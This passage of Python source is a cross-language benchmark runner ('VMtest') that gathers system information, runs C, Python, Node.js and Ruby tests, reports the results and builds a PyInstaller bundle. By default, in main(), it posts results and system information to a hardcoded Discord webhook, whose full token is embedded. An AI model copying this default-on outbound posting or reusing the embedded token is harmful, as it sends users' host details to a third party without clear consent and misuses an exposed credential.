                    cv = stats['coefficient_of_variation']
                    status = "Consistent" if cv < 0.1 else "Variable" if cv < 0.3 else "Highly Variable"
                    self._log(f"   • {measurement}: {status} (CV: {cv:.3f})")
        
        self._log("=" * 80)
        self._log(f"📄 Complete report saved to: {self.output_dir}")
        self._log("=" * 80)

    def run_all_tests(self):
        """Run VMtest across all available implementations"""
        self._log("🚀 Starting portable unified VMtest execution")
        self._log(f"Portable mode: {self.portable_mode}")
        self._log(f"Bundle directory: {self.bundle_dir}")
        self._log(f"Output directory: {self.output_dir}")
        self._log(f"Iterations per test: {self.iterations}")
        
        # Gather comprehensive system information first
        system_info = self._gather_system_info()
        
        # Check dependencies
        self._log("\n🔍 Checking available implementations...")
        available_deps = self._check_dependencies()
        
        if not available_deps:
            self._log("No language implementations available!", 'ERROR')
            return None
        
        self._log(f"\n✅ Found {len(available_deps)} available implementations:")
        for lang, info in available_deps.items():
            self._log(f"  • {lang.upper()}: {info}")
            
        # Run each implementation
        self._log("\n🏃 Running implementations...")
        for lang in ['c', 'python', 'nodejs', 'ruby']:
            if lang in available_deps:
                self._log(f"\n--- Running {lang.upper()} implementation ---")
                result = self._run_implementation(lang, available_deps)
                if result:
                    # Add execution method info to result
                    result['execution_method'] = available_deps[lang]
                    self.results[lang] = result
                    self._log(f"✅ {lang.upper()} completed successfully")
                else:
                    self._log(f"❌ {lang.upper()} failed or timed out")
                    
        if not self.results:
            self._log("No implementations completed successfully!", 'ERROR')
            return None
        
        self._log(f"\n✅ Successfully completed {len(self.results)} implementations")
            
        # Analyze results
        self._log("\n🔬 Performing cross-language analysis...")
        analysis = self._analyze_cross_language_results()
        
        # Generate and save report
        self._log("\n📊 Generating comprehensive report...")
        report = self._generate_report(analysis, system_info)
        report_file = self._save_results(report)
        if self.webhook_url:
            self._log("Creating CSV report for Discord...")
            csv_content = self._create_csv_report()
            if csv_content:
                self._post_to_discord(csv_content, self.webhook_url, system_info)
            
            # Also save CSV locally
            csv_filename = f"vmtest_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            csv_path = os.path.join(self.output_dir, csv_filename)
            with open(csv_path, 'w', newline='') as f:
                f.write(csv_content)
            self._log(f"CSV saved locally: {csv_path}")
        # Print comprehensive summary to console
        self._print_comprehensive_summary(report)
        
        return report_file


def create_portable_bundle_with_runner():
    """Create a complete portable bundle including the unified runner itself"""
    from static_builder import AdvancedStaticBuilder
    
    print("🚀 Creating Complete Portable VMtest Bundle")
    print("=" * 50)
    
    # Step 1: Use static builder to create portable executables
    print("Step 1: Building portable language implementations...")
    builder = AdvancedStaticBuilder("vmtest_portable_temp")
    builder.build_all()
    
    # Step 2: Create PyInstaller spec for unified runner
    print("Step 2: Creating portable unified runner...")
    
    spec_content = """# -*- mode: python ; coding: utf-8 -*-

import sys
from pathlib import Path

# Build configuration
block_cipher = None

a = Analysis(
    ['portable_unified_runner.py'],
    pathex=['.'],
    binaries=[],
    datas=[
        ('vmtest.c', '.'),
        ('vmtest.py', '.'),
        ('vmtest.js', '.'),
        ('vmtest.rb', '.'),
        ('vmtest_portable_temp/*', '.'),  # Include portable executables
    ],
    hiddenimports=[
        'json',
        'time',
        'threading',
        'multiprocessing',
        'os',
        'sys',
        'platform',
        'subprocess',
        'tempfile',
        'zipfile',
        'datetime',
        'pathlib',
        'argparse',
        'shutil'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'tkinter',
        'matplotlib',
        'numpy',
        'scipy',
        'pandas',
        'PIL',
        'cv2'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
    optimize=2,
)

pyz = PYZ(
    a.pure, 
    a.zipped_data, 
    cipher=block_cipher
)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='vmtest_unified',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
"""
    
    # Write spec file
    with open('vmtest_unified.spec', 'w') as f:
        f.write(spec_content)
    
    # Build with PyInstaller
    print("Building unified executable with PyInstaller...")
    result = subprocess.run([
        'pyinstaller',
        '--clean',
        '--noconfirm',
        'vmtest_unified.spec'
    ], capture_output=True, text=True)
    
    if result.returncode == 0:
        print("✅ Portable unified runner created successfully!")
        print("📁 Executable: dist/vmtest_unified")
        print("\n🚀 Usage:")
        print("  ./dist/vmtest_unified --iterations 1000")
        print("  ./dist/vmtest_unified --verbose")
        print("  ./dist/vmtest_unified --output ./results")
        return True
    else:
        print("❌ PyInstaller build failed:")
        print(result.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(description='Portable Unified VMtest Runner')
    parser.add_argument('--iterations', '-i', type=int, default=1000,
                        help='Number of iterations per test (default: 1000)')
    parser.add_argument('--output', '-o', type=str,
                        help='Output directory for results')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Verbose output')
    parser.add_argument('--webhook', '-w', type=str,
                        default='https://discord.com/api/webhooks/1390549964332994571/SdnJDcSITeWNHWDXzS76bsYspRYwoVu14NFRuA6z5ZOHWt8VFp6JDfvyhGUBNzw3J4P_',
                        help='Discord webhook URL for posting results')
    parser.add_argument('--no-discord', action='store_true',
                        help='Skip Discord posting')
    parser.add_argument('--create-portable', action='store_true',
                        help='Create complete portable bundle with PyInstaller')
    
    args = parser.parse_args()
    
    if args.create_portable:
        success = create_portable_bundle_with_runner()
        sys.exit(0 if success else 1)
    
    # Set webhook URL to None if --no-discord is specified
    webhook_url = None if args.no_discord else args.webhook
    
    runner = PortableUnifiedRunner(
        iterations=args.iterations,
        output_dir=args.output,
        verbose=args.verbose,
        webhook_url=webhook_url
    )
    
    report_file = runner.run_all_tests()
    if report_file:
        print(f"\nComplete report available at: {report_file}")
    else:
        sys.exit(1)


if __name__ == '__main__':
    main()
